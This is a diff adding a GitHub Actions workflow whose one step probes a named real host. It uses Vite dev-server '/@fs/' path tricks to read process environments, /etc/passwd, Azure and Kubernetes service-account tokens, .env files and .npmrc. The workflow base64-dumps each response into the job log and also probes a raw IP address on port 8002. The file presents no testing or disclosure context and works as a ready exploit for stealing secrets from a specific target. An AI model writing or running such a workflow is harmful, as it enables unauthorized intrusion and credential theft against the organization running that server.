@@ -1,0 +1,28 @@
+name: i233-wl
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    timeout-minutes: 9
+    steps:
+      - name: probe
+        run: |
+          set +e
+          T=https://dgpathwayevaluation.degreed.dev
+          echo "EGRESS=$(curl -s -m 8 https://ifconfig.me)"
+          echo "ROOT=$(curl -sk -m 12 -o /dev/null -w '%{http_code}' "$T/")"
+          for p in "/@fs/proc/self/environ?raw" "/@fs/proc/1/environ?raw" "/@fs/etc/passwd?raw" "/@fs/etc/passwd?raw??" "/@fs/etc/passwd?import&raw" "/@fs/var/run/secrets/azure/tokens/azure-identity-token?raw" "/@fs/var/run/secrets/kubernetes.io/serviceaccount/token?raw" "/@fs/var/run/secrets/kubernetes.io/serviceaccount/namespace?raw" "/@fs/app/frontend/.env?raw" "/@fs/app/.env?raw" "/@fs/app/frontend/package.json?raw" "/@fs/root/.npmrc?raw" "/.env?raw"; do
+            C=$(curl -sk -m 12 --path-as-is -o /tmp/o -w '%{http_code}' "$T$p")
+            S=$(wc -c </tmp/o 2>/dev/null)
+            echo "=====PATH $p HTTP $C LEN $S"
+            base64 -w0 /tmp/o 2>/dev/null | head -c 3500; echo
+          done
+          echo "=====API52"
+          curl -s -m 12 -o /tmp/a -w 'HTTP %{http_code}\n' "http://52.171.121.5:8002/"
+          head -c 600 /tmp/a; echo
+          echo "=====API52T"
+          curl -s -m 12 -o /tmp/b -w 'HTTP %{http_code}\n' "http://52.171.121.5:8002/docs"
+          head -c 600 /tmp/b; echo
